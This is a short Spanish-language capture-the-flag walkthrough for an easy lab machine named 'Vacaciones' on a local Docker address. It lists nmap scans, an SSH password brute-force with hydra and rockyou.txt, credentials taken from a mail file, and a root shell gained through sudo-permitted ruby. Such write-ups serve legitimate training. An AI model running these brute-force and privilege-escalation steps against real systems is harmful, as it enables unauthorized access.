Maquina: Vacaciones

Autor: Romabri

Dificultad: Muy Facil

![Screenshot 2024-11-08 192314](https://github.com/user-attachments/assets/557d26ce-6f24-43d1-b04f-a67a624d8b3c)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-08 190145](https://github.com/user-attachments/assets/19f5d6e5-e987-4be9-b8bb-7a39fd4d2fed)

sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

![Screenshot 2024-11-08 190641](https://github.com/user-attachments/assets/391e44bf-ebf5-4b96-850f-37ec520bb040)

sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted

![Screenshot 2024-11-08 190513](https://github.com/user-attachments/assets/2f080d1c-4f14-4eaf-a95c-80116a1518f5)

miramos la web
https://172.17.0.2

![Screenshot 2024-11-08 191601](https://github.com/user-attachments/assets/c758f9f6-f4f3-4ca3-b64e-564f343916a0)

miramos el codigo fuente y obtenemos 2 usuarios que podemos explotar

![Screenshot 2024-11-08 191624](https://github.com/user-attachments/assets/a14a09ef-e3c6-4ca8-b206-3177be5bffee)

sudo hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
obtenemos password de camilo

![Screenshot 2024-11-08 190858](https://github.com/user-attachments/assets/fb4bd662-89c2-4751-b35a-439cdce62a01)

ssh camilo@172.17.0.2

![Screenshot 2024-11-08 190958](https://github.com/user-attachments/assets/6730071b-f16b-4e3a-afca-2118360a0929)

sudo -l
vemos que camilo no tiene permisos

![Screenshot 2024-11-08 191131](https://github.com/user-attachments/assets/ec62cdd9-11e7-422a-a680-ec3605ca9c83)

buscamos el correo que nos ponia en la web
/var/mail$ cd camilo
ls
cat correo.txt

y descubrimos las credenciales del otro usuario

![Screenshot 2024-11-08 191144](https://github.com/user-attachments/assets/003190ed-4b69-4afb-afb9-14a6d74b2935)

accedemos a juan por ssh
ssh juan@172.17.0.2

![Screenshot 2024-11-08 191218](https://github.com/user-attachments/assets/79bffcdd-c74f-4a83-9a3e-fa67dd5f328f)

sudo -l
descubrimos que podemos ejecutar ruby como usuario root
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami

![Screenshot 2024-11-08 191256](https://github.com/user-attachments/assets/7ad92b01-02fd-40d0-8f7b-1e405099b78f)
